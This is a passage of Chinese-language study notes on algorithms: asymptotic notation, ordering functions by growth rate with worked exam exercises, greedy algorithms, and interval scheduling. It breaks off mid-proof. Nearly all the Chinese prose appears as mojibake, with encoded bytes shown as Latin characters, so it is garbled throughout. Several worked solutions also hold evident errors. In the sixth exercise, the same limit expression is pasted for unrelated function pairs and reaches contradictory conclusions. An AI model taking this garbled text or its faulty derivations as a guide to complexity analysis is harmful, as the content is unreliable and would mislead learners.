è‡ªé¡¶å‘ä¸‹ã€‚\n\nåˆ†æ²»ç®—æ³•ï¼šå°†ä¸€ä¸ªé—®é¢˜åˆ†è§£æˆç‹¬ç«‹çš„å­é—®é¢˜ï¼Œæ±‚è§£æ¯ä¸ªå­é—®é¢˜ï¼Œå¹¶å°†å­é—®é¢˜çš„è§£ç»„åˆèµ·æ¥å½¢æˆåŸé—®é¢˜çš„è§£ã€‚  è‡ªé¡¶å‘ä¸‹ã€‚\n\nåŠ¨æ€è§„åˆ’ï¼šæŠŠä¸€ä¸ªé—®é¢˜åˆ†è§£æˆä¸€ç³»åˆ—ç›¸äº’é‡å çš„å­é—®é¢˜ï¼Œå¹¶ä¸ºè¶Šæ¥è¶Šå¤§çš„å­é—®é¢˜å»ºç«‹è§£å†³æ–¹æ¡ˆã€‚è‡ªåº•å‘ä¸Šã€‚\n\n## â‘¡ç®—æ³•å¤æ‚åº¦\n\n> **æœ¬ç« é‡ç‚¹ï¼š**\n>\n> - ç†è§£æŒ‡æ•°å¢é•¿çš„ææ€–ï¼›ç†è§£ç®—æ³•åˆ†æé‡Œä¸ºä»€ä¹ˆå¸¸æ•°å€çš„å·®åˆ«å¯ä»¥è¢«å¿½ç•¥\n>\n> - æŒæ¡æ¸è¿‘ç¬¦å·Oã€Wã€Qçš„å«ä¹‰ï¼Œèƒ½åˆ¤æ–­ä¸€ä¸ªå‡½æ•°å±äºå“ªä¸ªæ¸è¿‘å¢é•¿é˜¶ï¼›\n>\n> - èƒ½å¯¹ç»™å®šå‡½æ•°æŒ‰ç…§æ¸è¿›å¢é•¿ç‡è¿›è¡Œæ’åºï¼Œå…¸å‹è€ƒé¢˜ï¼š\n\n### â¶æ¸è¿‘ç¬¦å·\n\n![Î˜,O,Î©çš„å›¾åƒè¡¨ç¤º](https://img.jwt1399.top//img/20211016202335.jpeg)\n\n**Î˜(æ¸è¿‘ç´§ç¡®ç•Œ)ï¼š**\n\n- å­˜åœ¨æ­£å¸¸æ•° c<sub>1</sub> , c<sub>2</sub>å’Œ n<sub>0</sub> ä½¿å¾—å¯¹æ‰€æœ‰n â‰¥ n<sub>0</sub>æœ‰ï¼šc<sub>1</sub>g(n) â‰¤ f(n) â‰¤ c<sub>2</sub>g(n)ï¼Œè®°ä¸ºf(n) âˆˆ Î˜(g(n))\n\n- ä¾‹å¦‚ï¼šn<sup>2</sup>+3n+2âˆˆÎ˜(n<sup>2</sup>)ã€n(n-1)/2âˆˆÎ˜ (n<sup>2</sup>)ã€4n<sup>2</sup>+5 âˆˆÎ˜ (n<sup>2</sup>)\n\n**O(æ¸è¿‘ä¸Šç•Œ)ï¼š**\n\n- å­˜åœ¨æ­£å¸¸æ•° c å’Œ n<sub>0</sub> ä½¿å¾—å¯¹æ‰€æœ‰n â‰¥ n<sub>0</sub>æœ‰ï¼šf(n) â‰¤  cg(n)ï¼Œè®°ä¸ºf(n) âˆˆ O(g(n))\n\n- ä¾‹å¦‚ï¼šn âˆˆO(n<sup>2</sup>)ã€100n+5 âˆˆO(n<sup>2</sup>)ã€n(n-1)/2 âˆˆO(n<sup>2</sup>)\n\n**Î©(æ¸è¿‘ä¸‹ç•Œ)ï¼š**\n\n- å­˜åœ¨æ­£å¸¸æ•° c å’Œ n<sub>0</sub> ä½¿å¾—å¯¹æ‰€æœ‰n â‰¥ n<sub>0</sub>æœ‰ï¼šf(n) â‰¥ cg(n)ï¼Œè®°ä¸ºf(n) âˆˆ Î©(g(n))\n- ä¾‹å¦‚ï¼šn<sup>3</sup>âˆˆÎ© (n<sup>2</sup>)ã€n(n+1)âˆˆÎ© (n<sup>2</sup>)ã€4n<sup>2</sup>+5 âˆˆÎ© (n<sup>2</sup>)\n\n![](https://img.jwt1399.top//img/20211016205620.png)\n\n### â·å¤æ‚åº¦\n\n>  æ—¶é—´å¤æ‚åº¦å…·æœ‰ã€Œæœ€å·®ã€ã€ã€Œå¹³å‡ã€ã€ã€Œæœ€ä½³ã€ä¸‰ç§æƒ…å†µï¼Œåˆ†åˆ«ä½¿ç”¨ O , Î˜ , Î© ä¸‰ç§ç¬¦å·è¡¨ç¤ºã€‚\n\næ ¹æ®ä»å°åˆ°å¤§æ’åˆ—ï¼Œå¸¸è§çš„ç®—æ³•æ—¶é—´å¤æ‚åº¦ä¸»è¦æœ‰ï¼š\n\nO(1) < O(logn)<O(n)<O(nlogn)<O(n<sup>2</sup>)<O(n<sup>3</sup>)<O(2<sup>n</sup>)<O(n!)<O(n<sup>n</sup>)\n\n![](https://img.jwt1399.top//img/20211016203924.png)\n\n### â¸æ¸è¿›å¢é•¿ç‡æ¯”è¾ƒ\n\næ–¹æ³•1ï¼š**å®šä¹‰æ³•**\n\næ‰¾åˆ°æ­£å¸¸æ•° c å’Œ n<sub>0</sub> ä½¿å¾—å¯¹æ‰€æœ‰n â‰¥ n<sub>0</sub> æœ‰ f\\(n\\) â‰¤ cg(n)ï¼Œåˆ™f(n) = O(g(n))\n\næ–¹æ³•2ï¼š**æé™æ³•**\n\næ¯”è¾ƒä¸¤ä¸ªå‡½æ•°f(n)å’Œg(n)çš„æ¸è¿‘å¢é•¿ç‡æ—¶ï¼Œå¯ä»¥å¯¹ä¸¤ä¸ªå‡½æ•°ç›¸é™¤ï¼Œç„¶åä»¤å˜é‡ n è¶‹å‘äºæ— ç©·ï¼Œçœ‹è¿™ä¸ªæé™å€¼æ˜¯æ— ç©·å¤§è¿˜æ˜¯ä¸€ä¸ªå¤§äºé›¶çš„å¸¸æ•°è¿˜æ˜¯è¶‹å‘äº0ã€‚\n\n![](https://img.jwt1399.top/img/image-20211016205209274.png)\n\n- å‰ä¸¤ç§æƒ…å†µæ„å‘³ç€f(n) âˆˆ O(g(n))\n- åä¸¤ç§æƒ…å†µæ„å‘³ç€f(n) âˆˆ Î©(g(n))\n- ç¬¬äºŒç§æƒ…å†µæ„å‘³ç€f(n) âˆˆ Î˜(g(n))\n\næ–¹æ³•3ï¼š**å–å¯¹æ•°æ³•**\n\nå¯¹äºæ¯”è¾ƒéš¾çš„æ¯”è¾ƒçš„ä¸¤ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å®ƒä»¬åŒæ—¶å–å¯¹æ•°åå†è¿›è¡Œæ¯”è¾ƒ\n\n`å¸¸è§å¯¹æ•°å…¬å¼ï¼š`\n\n- log<sub>a</sub>m*n = log<sub>a</sub>m + log<sub>a</sub>n\n\n- log<sub>a</sub>(m/n) = log<sub>a</sub>m - log<sub>a</sub>n\n- log<sub>a</sub>m<sup>n</sup> = nlog<sub>a</sub>m\n- log<sub>a</sub><sup>n</sup>âˆšm = (1/n)log<sub>a</sub>m\n- log<sub>a</sub>b = log<sub>c</sub>b / log<sub>c</sub>a \n- a<sup>log<sub>a</sub>b</sup> = b\n\n### â¹çœŸé¢˜ç»ƒä¹ \n\n#### â€é¢˜ç›®1\n\nåˆ¤æ–­ f(n) = 32n<sup>2</sup> + 17n + 32 å±äºå“ªäº›æ¸è¿‘å¢é•¿é˜¶\nO(n), Î©(n), Î˜(n), O(n<sup>2</sup>), Î˜(n<sup>2</sup>), Î©(n<sup>2</sup>),O(n<sup>3</sup>), Î©(n<sup>3</sup>), Î˜(n<sup>3</sup>). \n\nf(n) å±äº Î©(n),O(n<sup>2</sup>), Î©(n<sup>2</sup>), Î˜(n<sup>2</sup>) ,O(n<sup>3</sup>) \nf(n) ä¸å±äº O(n), Î˜(n), Î©(n<sup>3</sup>), Î˜(n<sup>3</sup>)\n\n#### âé¢˜ç›®2\n\n![](https://img.jwt1399.top//img/20211016213402.png)\n\nf<sub>1</sub>(n) = âˆšn + log<sup>100</sup>n = O(âˆšn)\n\nf<sub>2</sub>(n) = 2<sup>logn</sup> * 2<sup>loglogn</sup> = nlogn\n\nf<sub>3</sub>(n) = 100logn + nlog3 = O(n)\n\nf<sub>4</sub>(n) = O(3<sup>n</sup>)ã€f<sub>5</sub>(n) = 100log<sup>2</sup>nã€f<sub>6</sub>(n) =  O(n!)\n\n(1)æ˜¾ç„¶ f<sub>3</sub>(n) ï¼œ f<sub>2</sub>(n) ï¼œ f<sub>4</sub>(n)ï¼œf<sub>6</sub>(n) \n\n(2)f<sub>5</sub>(n) æ˜¯å¯¹æ•°çš„å¹‚ï¼Œf<sub>1</sub>(n) æ˜¯å¹‚å‡½æ•°ï¼Œå› æ­¤ f<sub>5</sub>(n)ï¼œ f<sub>1</sub>(n)\n\nç»¼ä¸Šæ‰€è¿°ï¼š f<sub>5</sub>(n) ï¼œ f<sub>1</sub>(n)ï¼œ f<sub>3</sub>(n) ï¼œ f<sub>2</sub>(n) ï¼œ f<sub>4</sub>(n)ï¼œf<sub>6</sub>(n) \n\n#### â‚é¢˜ç›®3\n\n![](https://img.jwt1399.top//img/20211016213526.png)\n\nf<sub>1</sub>(n) = nlog<sup>n</sup>n ã€f<sub>2</sub>(n) = lognã€f<sub>3</sub>(n) = log<sup>5</sup>n \n\nf<sub>4</sub>(n) = n<sup>1/5</sup>ã€f<sub>5</sub>(n) = n<sup>1/10</sup>log<sup>50</sup>n\n\n(1)f<sub>2</sub>(n)ï¼œ f<sub>3</sub>(n)\n\n(2)f<sub>3</sub>(n)æ˜¯å¯¹æ•°çš„å¹‚ï¼Œf<sub>4</sub>(n) æ˜¯å¹‚å‡½æ•°ï¼Œå› æ­¤ f<sub>3</sub>(n)ï¼œ f<sub>4</sub>(n)\n\n(3) lim f<sub>1</sub>(n)/ f<sub>4</sub>(n) = lim (n<sup>4/5</sup>log<sup>n</sup>n) = âˆ ï¼Œå› æ­¤ f<sub>4</sub>(n) < f<sub>1</sub>(n) \n\nâ€‹\t\tlim f<sub>5</sub>(n)/ f<sub>4</sub>(n) = lim (n<sup>-1/10</sup>log<sup>50</sup>n) = 0 ï¼Œå› æ­¤ f<sub>5</sub>(n) < f<sub>4</sub>(n) \n\n(4)å¯¹f<sub>1</sub>(n)ã€f<sub>3</sub>(n)ã€f<sub>5</sub>(n)å–å¯¹æ•°\n\nâ€‹\tlogf<sub>1</sub>(n) = logn + nloglogn = Î˜(nloglogn) = O(n)\n\nâ€‹\tlogf<sub>3</sub>(n) = 5loglogn = O(loglogn)\n\nâ€‹\tlogf<sub>5</sub>(n) = (1/10)logn + 50loglogn = O(logn)\n\nå› æ­¤ f<sub>3</sub>(n) ï¼œ f<sub>5</sub>(n) ï¼œ f<sub>1</sub>(n)\n\nç»¼ä¸Šæ‰€è¿°ï¼š f<sub>2</sub>(n)ï¼œ f<sub>3</sub>(n)ï¼œ f<sub>5</sub>(n) ï¼œ f<sub>4</sub>(n)ï¼œ f<sub>1</sub>(n)\n\n#### âƒé¢˜ç›®4\n\n![](https://img.jwt1399.top/img/202111161254116.png)\n\nå¯¹f<sub>1</sub>(n)ã€f<sub>2</sub>(n)ã€f<sub>3</sub>(n)ã€f<sub>3</sub>(n)ã€f<sub>5</sub>(n)å–å¯¹æ•°\n\nâ€‹\tlogf<sub>1</sub>(n) = nlog10 = O(n)\n\nâ€‹\tlogf<sub>2</sub>(n) = 1/3logn = O(logn)\n\nâ€‹\tlogf<sub>3</sub>(n) = nlogn = O(nlogn)\n\nâ€‹\tlogf<sub>4</sub>(n) = loglogn = O(loglogn)\n\nâ€‹\tlogf<sub>5</sub>(n) = âˆšlogn = O(âˆšlogn)\n\nå› æ­¤ f<sub>4</sub>(n)ï¼œf<sub>5</sub>(n)ï¼œ f<sub>2</sub>(n)ï¼œ f<sub>1</sub>(n) ï¼œ f<sub>3</sub>(n) \n\n#### â„é¢˜ç›®5\n\n![](https://img.jwt1399.top//img/20211021120457.png)\n\nf<sub>2</sub>(n) = 2<sup>logn</sup>*2<sup>loglogn</sup> = nlogn\n\nlim f<sub>1</sub>(n)/ f<sub>2</sub>(n) = lim (log<sup>99</sup>n) = âˆ ï¼Œå› æ­¤ f<sub>2</sub>(n) < f<sub>1</sub>(n) \n\nlim f<sub>1</sub>(n)/ f<sub>3</sub>(n) = lim (log<sup>99.5</sup>n/n<sup>0.25</sup>) = 0 ï¼Œå› æ­¤ f<sub>1</sub>(n) < f<sub>3</sub>(n) \n\nlim f<sub>5</sub>(n)/ f<sub>3</sub>(n) = L = âˆ ï¼Œå› æ­¤ f<sub>3</sub>(n) < f<sub>5</sub>(n) \n\nlim f<sub>5</sub>(n)/ f<sub>4</sub>(n) = L = 0 ï¼Œå› æ­¤ f<sub>5</sub>(n) < f<sub>4</sub>(n) \n\nç»¼ä¸Šæ‰€è¿°ï¼š f<sub>2</sub>(n)ï¼œf<sub>1</sub>(n)ï¼œ f<sub>3</sub>(n)ï¼œ f<sub>5</sub>(n) ï¼œ f<sub>4</sub>(n) \n\n#### â…é¢˜ç›®6\n\n![](https://img.jwt1399.top//img/20211021120454.png)\n\nf<sub>1</sub>(n) = nlog<sup>n</sup>nã€f<sub>2</sub>(n) = 100log<sup>2</sup>nã€f<sub>3</sub>(n) = n<sup>2</sup>lognã€f<sub>4</sub>(n) = nlognã€f<sub>5</sub>(n) = n<sup>1/10</sup>\n\n(1)æ˜¾ç„¶ f<sub>4</sub>(n)ï¼œf<sub>1</sub>(n)\n\n(2)f<sub>2</sub>(n)æ˜¯å¯¹æ•°çš„å¹‚ï¼Œf<sub>5</sub>(n) æ˜¯å¹‚å‡½æ•°ï¼Œå› æ­¤ f<sub>2</sub>(n)ï¼œ f<sub>5</sub>(n)\n\n(3)lim f<sub>3</sub>(n)/ f<sub>5</sub>(n) = lim (n<sup>19/10</sup>logn) = âˆ ï¼Œå› æ­¤ f<sub>5</sub>(n) < f<sub>3</sub>(n) \n\nlim f<sub>1</sub>(n)/ f<sub>2</sub>(n) = lim (nlog<sup>n-2</sup>n/100) = âˆ ï¼Œå› æ­¤ f<sub>2</sub>(n) < f<sub>1</sub>(n) \n\nlim f<sub>2</sub>(n)/ f<sub>4</sub>(n) = lim (100logn/n) = 0 ï¼Œå› æ­¤ f<sub>2</sub>(n) < f<sub>4</sub>(n) \n\nlim f<sub>5</sub>(n)/ f<sub>4</sub>(n) = lim (100logn/n) = 0 ï¼Œå› æ­¤ f<sub>5</sub>(n) < f<sub>4</sub>(n) \n\nlim f<sub>3</sub>(n)/ f<sub>4</sub>(n) = lim (100logn/n) = âˆ ï¼Œå› æ­¤ f<sub>4</sub>(n) < f<sub>3</sub>(n) \n\nlim f<sub>1</sub>(n)/ f<sub>3</sub>(n) = lim ((log<sup>n-1</sup>n)/n) = âˆ ï¼Œå› æ­¤ f<sub>3</sub>(n) < f<sub>1</sub>(n) \n\nç»¼ä¸Šæ‰€è¿°ï¼š  f<sub>2</sub>(n) ï¼œ f<sub>5</sub>(n) ï¼œ f<sub>4</sub>(n)ï¼œ f<sub>3</sub>(n)ï¼œf<sub>1</sub>(n)\n\n## â‘¢è´ªå¿ƒç®—æ³•\n\n> **æœ¬ç« é‡ç‚¹ï¼š**\n>\n> - ç†è§£è´ªå¿ƒç®—æ³•çš„æ€æƒ³ï¼›\n> - èƒ½åˆ¤æ–­ä¸€ä¸ªç®—æ³•æ˜¯å¦ä¸ºè´ªå¿ƒç®—æ³•ï¼›\n> - æŒæ¡å·¥ä½œå®‰æ’é—®é¢˜Interval schedulingçš„è´ªå¿ƒç®—æ³•åŠå…¶æ­£ç¡®æ€§è¯æ˜ã€‚\n\n### â¶ç®—æ³•åˆ†æ\n\nè´ªå¿ƒç®—æ³•å°±æ˜¯ç”¨è®¡ç®—æœºæ¨¡æ‹Ÿä¸€ä¸ªã€Œè´ªå¿ƒçš„äººã€æ¥åšå‡ºå†³ç­–ã€‚è¿™ä¸ªè´ªå¿ƒçš„äººæ˜¯ç›®å…‰çŸ­æµ…çš„ï¼Œä»–æ¯æ¬¡æ€»æ˜¯ï¼š\n\n- åªåšå‡º**å½“å‰çœ‹æ¥æœ€å¥½çš„é€‰æ‹©**\n- **åªçœ‹çœ¼å‰çš„åˆ©ç›Šï¼Œè€Œä¸è€ƒè™‘åšå‡ºé€‰æ‹©åå¯¹æœªæ¥é€ æˆçš„å½±å“**\n- å¹¶ä¸”ä»–ä¸€æ—¦åšå‡ºäº†é€‰æ‹©ï¼Œå°±**æ²¡æœ‰åŠæ³•åæ‚”**ï¼ˆä¸å¯å›æº¯ï¼‰\n\n`æ€»ç»“ï¼š`åœ¨å¯¹é—®é¢˜æ±‚è§£æ—¶ï¼Œæ€»æ˜¯åšå‡ºåœ¨**å½“å‰æœ€å¥½çš„é€‰æ‹©**ã€‚ä¹Ÿå°±æ˜¯è¯´å¹¶**ä¸ä»æ•´ä½“æœ€ä¼˜è€ƒè™‘**ï¼Œä»–æ‰€åšå‡ºçš„æ˜¯åœ¨æŸç§æ„ä¹‰ä¸Šçš„**å±€éƒ¨æœ€ä¼˜è§£**ã€‚ å› æ­¤è´ªå¿ƒç®—æ³•ä¸æ˜¯å¯¹**æ‰€æœ‰é—®é¢˜**éƒ½èƒ½å¾—åˆ°æ•´ä½“æœ€ä¼˜è§£ã€‚\n\n**åº”ç”¨åœºæ™¯**\n\nè§£å†³ä¸€ä¸ªé—®é¢˜éœ€è¦å¤šä¸ªæ­¥éª¤ï¼Œæ¯ä¸€ä¸ªæ­¥éª¤æœ‰å¤šç§é€‰æ‹©ã€‚**æƒ³æ¸…æ¥šå±€éƒ¨æœ€ä¼˜ï¼Œæƒ³æ¸…æ¥šå…¨å±€æœ€ä¼˜ï¼Œæ„Ÿè§‰å±€éƒ¨æœ€ä¼˜æ˜¯å¯ä»¥æ¨å‡ºå…¨å±€æœ€ä¼˜ï¼Œå¹¶æƒ³ä¸å‡ºåä¾‹ï¼Œé‚£ä¹ˆå°±è¯•ä¸€è¯•è´ªå¿ƒ**ã€‚\n\n **è§£é¢˜æ­¥éª¤**\n\nè´ªå¿ƒç®—æ³•ä¸€èˆ¬åˆ†ä¸ºå¦‚ä¸‹ä¸‰æ­¥ï¼š\n\n- **1.åˆ†è§£ï¼š**å°†é—®é¢˜åˆ†è§£ä¸ºè‹¥å¹²ä¸ªå­é—®é¢˜\n- **2.è§£å†³ï¼š**æ‰¾å‡ºé€‚åˆçš„è´ªå¿ƒç­–ç•¥ï¼Œæ±‚è§£æ¯ä¸€ä¸ªå­é—®é¢˜çš„æœ€ä¼˜è§£\n- **3.åˆå¹¶ï¼š**å°†å±€éƒ¨æœ€ä¼˜è§£å †å æˆå…¨å±€æœ€ä¼˜è§£\n\n### â·æ­£ç¡®æ€§è¯æ˜\n\n> **è´ªå¿ƒç®—æ³•æœ€éš¾çš„éƒ¨åˆ†ä¸åœ¨äºé—®é¢˜çš„æ±‚è§£ï¼Œè€Œåœ¨äºæ­£ç¡®æ€§çš„è¯æ˜**ï¼Œå¸¸ç”¨çš„è¯æ˜æ–¹æ³•æœ‰**å½’çº³æ³•**å’Œ**åè¯æ³•**ã€‚\n\n#### â€è¯æ˜æ–¹æ³•\n\n- å…ˆå‡è®¾è´ªå¿ƒç®—æ³•å¾—åˆ°çš„è§£ä¸æ˜¯æœ€ä¼˜è§£ï¼Œå‡è®¾ S1 æ˜¯è´ªå¿ƒç®—æ³•å¾—åˆ°çš„è§£ï¼ŒS2 æ˜¯æ‰€æœ‰æœ€ä¼˜è§£ä¸­å’Œ S1 å…·æœ‰æœ€å¤šç›¸åŒå…ƒç´ çš„è§£ï¼›\n- ç„¶åæ¯”è¾ƒ S1 å’Œ S2ï¼Œè§‚å¯Ÿ S1 å’Œ S2 ä¸­ç¬¬ä¸€ä¸ªï¼ˆæœ€å‰é¢ä¸€ä¸ªï¼‰ä¸ä¸€æ ·çš„å…ƒç´ ï¼›\n- ç„¶ååœ¨è§£ S2 ä¸­å°†ä¸ä¸€æ ·çš„å…ƒç´ æ¢æˆ S1 ä¸­çš„é‚£ä¸ªå…ƒç´ å¾—åˆ°å¦ä¸€ä¸ªæœ€ä¼˜è§£ S3ï¼Œè¿™æ · S3 å’Œ S1 æ¯” S2 å’Œ S1æœ‰æ›´å¤šç›¸åŒå…ƒç´ ï¼Œå’Œå‡è®¾ S2 æ˜¯ä¸ S1 æœ‰æœ€å¤šç›¸åŒå…ƒç´ çš„æœ€ä¼˜è§£çŸ›ç›¾ï¼Œè¿™æ ·æ¥æ¨å¯¼ S1 æ˜¯æœ€ä¼˜è§£ã€‚\n\n#### âçœŸé¢˜ç»ƒä¹ \n\næœ‰ä¸€å †è´§ç‰©éœ€è¦è¢«è¿èµ°ï¼Œç°åœ¨æœ‰å››ç§è¿è´§è½¦ï¼šæ¨è½¦çš„å®¹é‡æœ€å°ï¼Œå°è´§è½¦çš„å®¹é‡æ˜¯æ¨è½¦å®¹é‡çš„2å€ï¼Œä¸­è´§è½¦çš„å®¹é‡æ˜¯ä¸¤è¾†å°è´§è½¦çš„å®¹é‡åŠ ä¸Šä¸€è¾†æ¨è½¦çš„å®¹é‡ï¼Œå¤§è´§è½¦çš„å®¹é‡æ˜¯ä¸€è¾†ä¸­è´§è½¦çš„å®¹é‡åŠ ä¸Šä¸€è¾†å°è´§è½¦çš„å®¹é‡å†åŠ ä¸Šä¸¤è¾†æ¨è½¦çš„å®¹é‡ã€‚å‡è®¾ä»¥ä¸Šå››ç§è½¦çš„æ•°é‡éƒ½éå¸¸å¤šã€‚ç°åœ¨è¦æ±‚ä½ è®¾è®¡ä¸€ç§æ–¹æ¡ˆæ´¾å‡ºæœ€å°‘è¾†è½¦å°†è´§ç‰©å…¨æ¬èµ°ï¼Œå…¶ä¸­é™¤äº†æ¨è½¦ä»¥å¤–å…¶å®ƒä¸‰ç§è½¦éƒ½å¿…é¡»è£…æ»¡æ‰èƒ½å‘è½¦ã€‚ä¸ºè¿™ä¸ªé—®é¢˜è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œå¹¶è¯æ˜è¯¥ç®—æ³•çš„æ­£ç¡®æ€§ã€‚  ï¼ˆ8åˆ†ï¼‰\n\n------\n\n å‚è€ƒç­”æ¡ˆï¼š\n\n è´ªå¿ƒç®—æ³•ï¼š\n\nå°†è½¦å‹æŒ‰å®¹é‡ç”±å¤§è‡³å°æ’åˆ—ï¼Œèƒ½è£…æ»¡å®¹é‡å¤§çš„è½¦å°±å…ˆè£…æ»¡å‘è½¦ï¼Œä¸è¡Œå°±è€ƒè™‘å®¹é‡å°ä¸€çº§çš„è½¦ã€‚\n\n è¯æ˜ï¼š\n\nè®¾æˆ‘ä»¬ç®—æ³•ç»™å‡ºçš„ç»“æœä¸ºS1ï¼Œå³æ¨è½¦ã€å°è´§è½¦ã€ä¸­è´§è½¦ã€å¤§è´§è½¦å„a1ï¼Œa2ï¼Œa3ï¼Œa4è¾†ï¼›S2 æ˜¯æ‰€æœ‰æœ€ä¼˜è§£ä¸­å’Œ S1 å…·æœ‰æœ€å¤šç›¸åŒå…ƒç´ çš„è§£ï¼Œå³æ¨è½¦ã€å°è´§è½¦ã€ä¸­è´§è½¦ã€å¤§è´§è½¦å„b1ï¼Œb2ï¼Œb3ï¼Œb4è¾†ã€‚å‡è®¾ S1 å’Œ S2 ä¸ä¸€æ ·ï¼Œå³ ai å’Œ bi ä¸ä¸€æ ·ã€‚\n\nå¦‚æœi=4ï¼Œåˆ™å°† S2 ä¸­ä¸¤ä¸ªä¸­è´§è½¦ï¼ˆæˆ–è€…4ä¸ªå°è´§è½¦ï¼‰æ¢æˆä¸€ä¸ªå¤§è´§è½¦å’Œä¸€ä¸ªæ¨è½¦ï¼Œæˆ–è€…ä¸€ä¸ªä¸­è´§è½¦å’Œä¸¤ä¸ªå°è´§è½¦ï¼ˆæˆ–è€…ã€‚ã€‚ã€‚ã€‚ï¼‰æ¢æˆä¸€ä¸ªå¤§è´§è½¦ã€‚\n\nå¦‚æœi=3ï¼Œåˆ™å°† S2 ä¸­ä¸¤ä¸ªå°è´§è½¦å’Œä¸€ä¸ªæ¨è½¦æ¢æˆä¸€ä¸ªä¸­è´§è½¦ï¼›ã€‚ã€‚ã€‚\n\nå¦‚æœi=2ï¼Œä¸¤ä¸ªæ¨è½¦æ¢æˆä¸€ä¸ªå°è´§è½¦ã€‚\n\né€šè¿‡å¦‚ä¸Šå˜æ¢å¾—åˆ°å¦ä¸€ä¸ªæœ€ä¼˜è§£ S3ï¼Œè¿™æ · S3 å’Œ S1 æ¯” S2 å’Œ S1æœ‰æ›´å¤šç›¸åŒå…ƒç´ ï¼Œå’Œå‡è®¾ S2 æ˜¯ä¸ S1 æœ‰æœ€å¤šç›¸åŒå…ƒç´ çš„æœ€ä¼˜è§£çŸ›ç›¾ï¼Œè¿™æ ·æ¥æ¨å¯¼ S1 æ˜¯æœ€ä¼˜è§£ã€‚\n\n### â¸åŒºé—´è°ƒåº¦(æ´»åŠ¨å®‰æ’)\n\n>**é—®é¢˜æè¿°ï¼š**è®¾æœ‰ n ä¸ªæ´»åŠ¨çš„é›†åˆ E={1, 2, â€¦, n}ï¼Œå…¶ä¸­ä»»æ„æ´»åŠ¨ i éƒ½æœ‰ä¸€ä¸ªèµ·å§‹æ—¶é—´ s<sub>i</sub> å’Œä¸€ä¸ªç»“æŸæ—¶é—´ f<sub>i</sub> ã€‚å¦‚æœé€‰æ‹©äº†æ´»åŠ¨ iï¼Œåˆ™å®ƒåœ¨åŠå¼€æ—¶é—´åŒºé—´ [s<sub>i</sub> , f<sub>i</sub>) å†…å ç”¨èµ„æºã€‚è‹¥åŒºé—´ [s<sub>i</sub> , f<sub>i</sub>) ä¸åŒºé—´ [s<sub>j</sub> , f<sub>j</sub>) ä¸ç›¸äº¤ï¼Œåˆ™ç§°**æ´»åŠ¨ i ä¸æ´»åŠ¨ j æ˜¯ç›¸å®¹**çš„ã€‚æ¯ä¸ªæ´»åŠ¨éƒ½è¦æ±‚ä½¿ç”¨åŒä¸€èµ„æºï¼Œå¦‚æ¼”è®²ä¼šåœºç­‰ï¼Œè€Œåœ¨åŒä¸€æ—¶é—´å†…åªæœ‰ä¸€ä¸ªæ´»åŠ¨èƒ½ä½¿ç”¨è¿™ä¸€èµ„æºã€‚æ´»åŠ¨å®‰æ’é—®é¢˜å°±æ˜¯è¦åœ¨æ‰€ç»™çš„æ´»åŠ¨é›†åˆä¸­é€‰å‡ºæœ€å¤§çš„ç›¸å®¹æ´»åŠ¨å­é›†åˆã€‚\n\n#### â€ç†è®ºåˆ†æ\n\nä¾‹å¦‚æœ‰å¦‚ä¸‹ 11 ä¸ªæ´»åŠ¨ï¼Œs[i] ä»£è¡¨ç¬¬ i ä¸ªæ´»åŠ¨å¼€å§‹æ—¶é—´ï¼Œf[i] ä»£è¡¨ç¬¬ i ä¸ªæ´»åŠ¨çš„ç»“æŸæ—¶é—´ï¼Œé€‰å‡ºæœ€å¤§çš„ç›¸å®¹æ´»åŠ¨å­é›†åˆ\n\n![](https://img.jwt1399.top//img/20211017214614.jpg)\n\n**1ã€åˆ†æé—®é¢˜**\n\næœ¬é—®é¢˜ä¸ºé€‰æ‹©å°½å¯èƒ½å¤šçš„ç›¸å®¹æ´»åŠ¨\n\nçº¦æŸæ¡ä»¶æ˜¯ä¸‹ä¸€ä¸ªæ´»åŠ¨å¼€å§‹æ—¶é—´å¤§äºæˆ–ç­‰äºä¸Šä¸€ä¸ªæ´»åŠ¨ç»“æŸæ—¶é—´ s[i] >= f[j]\n\n**2ã€é€‰æ‹©é€‚åˆçš„è´ªå¿ƒç­–ç•¥**\n\nå¯èƒ½çš„è´ªå¿ƒé€‰æ‹©ç­–ç•¥ï¼š\n\n- â‘ æ¯æ¬¡é€‰æ‹©**å¼€å§‹æ—¶é—´æœ€æ—©**çš„æ´»åŠ¨\n- â‘¡æ¯æ¬¡é€‰æ‹©**æŒç»­æ—¶é—´æœ€çŸ­**çš„æ´»åŠ¨\n- â‘¢æ¯æ¬¡é€‰æ‹©**ç»“æŸæ—¶é—´æœ€æ—©**çš„æ´»åŠ¨\n\nä¾æ¬¡è¯æ˜ä¸Šé¢å“ªç§æ€è·¯å¯ä»¥åº”ç”¨äºæœ¬é¢˜ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ç”¨ä¸åŒé¢œè‰²çš„çº¿æ¡ä»£è¡¨æ¯ä¸ªæ´»åŠ¨ï¼Œçº¿æ¡çš„é•¿åº¦å°±æ˜¯æ´»åŠ¨æ‰€å æ®çš„æ—¶é—´æ®µï¼Œè“è‰²çš„çº¿æ¡è¡¨ç¤ºæˆ‘ä»¬å·²ç»é€‰æ‹©çš„æ´»åŠ¨ï¼›çº¢è‰²çš„çº¿æ¡è¡¨ç¤ºæˆ‘ä»¬æ²¡æœ‰é€‰æ‹©çš„æ´»åŠ¨ã€‚\n\n**â‘ **æ¯æ¬¡é€‰æ‹©**å¼€å§‹æ—¶é—´æœ€æ—©**çš„æ´»åŠ¨ï¼ˆ`ä¸æ˜¯æœ€ä¼˜è§£`ï¼‰\n\n![](https://img.jwt1399.top/img/WWEMNdAZPFyV9CATDQaG.png)\n\n- è¯æ˜ï¼ˆåè¯æ³•ï¼‰ï¼š\n  - å…ˆæ¥çœ‹å¼€å§‹æœ€æ—©ï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ°åä¾‹ï¼Œå¦‚å›¾è´ªå¼€å§‹æœ€æ—©ï¼Œé‚£ä¹ˆé€‰æ‹©è“è‰²çš„æ´»åŠ¨ï¼Œæ˜¾ç„¶ä¸æ˜¯æœ€ä¼˜è§£ï¼Œå› ä¸ºé€‰æ‹©çº¢è‰²çš„æ´»åŠ¨ï¼Œå¯ä»¥å‚åŠ 2æ¬¡ï¼Œè€Œè“è‰²æ´»åŠ¨åªèƒ½å‚åŠ ä¸€æ¬¡\n  - 